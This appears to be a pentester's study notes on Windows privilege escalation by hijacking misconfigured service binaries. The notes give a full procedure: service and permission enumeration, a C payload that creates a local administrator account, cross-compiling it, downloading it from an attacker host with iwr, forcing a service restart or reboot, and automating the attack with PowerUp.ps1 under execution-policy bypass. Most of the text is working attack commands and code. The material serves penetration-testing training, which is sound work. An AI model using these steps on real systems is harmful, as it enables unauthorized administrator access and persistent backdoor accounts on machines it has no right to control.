- A Windows Service is a long-running background executable or application managed by the Service Control Manager.
- They are similar to daemons on Unix
- Windows Services can be managed by the Services snap-in, PowerShell, or sc.exe.
- Services are run by LocalSystem (NT AUTHORITY, SYSTEM, BUILTIN), Network Service, and Local Service user accounts.
- Users or programs creating a service can choose either one of those accounts, a domain user, or a local user.

### Writable Files + Directories

Writable files from root directory:
```
cmd /c 'dir C:\ /a-r-d /s /b'
```

Writable directories from root directory:
```
cmd /c 'dir C:\ /ad-r /s /b'
```

### Manual Service Binary Hijacking
- Each Windows service has an associated binary file.
- They are executed when the service is started or transitioned into a running state.
- An unprivileged user can tamper with misconfigured services being run by higher authority to privesc.
- Look for services with binaries outside of the System32 folder, since they are probably installed and configured by the user manually.

1. Enumerate running processes to identify any to abuse:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Alt. Get-Service ... Get-WmiObject ... services.msc
```
2. Enumerate permissions for the identified services:
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"

Alt. Get-ACL

Permissions:
F: Full access
M: Modify access
RX: Read and execute access
R: Read-only access
W: Write-only access
```
3. Create malicious binary. Example in C which will create a new user:
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user zombie password123! /add");
  i = system ("net localgroup administrators zombie /add");
  
  return 0;
}
```
4. Cross-compile it to an 64-bit .exe for Windows:
```bash
x86_64-w64-mingw32-gcc <file>.c -o <file>.exe
```
5. Serve the binary, download it, and move it to the correct directory:
```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move <pre-path> <post-path>
```
6. Try to restart the service manually (if permissioned):
```powershell
net stop <servicename>
net start <servicename>

#Or run:
Restart-Service <servicename>

#Service name is not the binary file
```
7. If not possible check if it starts again on reboot:
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<servicename>'}
```
8. Check if is privileged to restart system (the state should not matter):
```powershell
whoami /priv
```
9. Issue a system reboot using:
```powershell
shutdown /r /t 0
```
10. Remember to repair the binary after escalation!

### Automatic Service Hijacking with PowerUp:
1. Serve the PowerUp.ps1 on your kali machine.
2. Download the script:
```powershell
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```
4. Run the script with bypass:
```powershell
 powershell -ep bypass
 . .\PowerUp.ps1
```
5. Now check modifiable services identified:
```powershell
Get-ModifiableServiceFile
```
6. Try to use the built-in AbuseFunction to install a service binary (where name is Service Name listed from above command):
```powershell
Install-ServiceBinary -Name 'mysql'
```
7. Win!
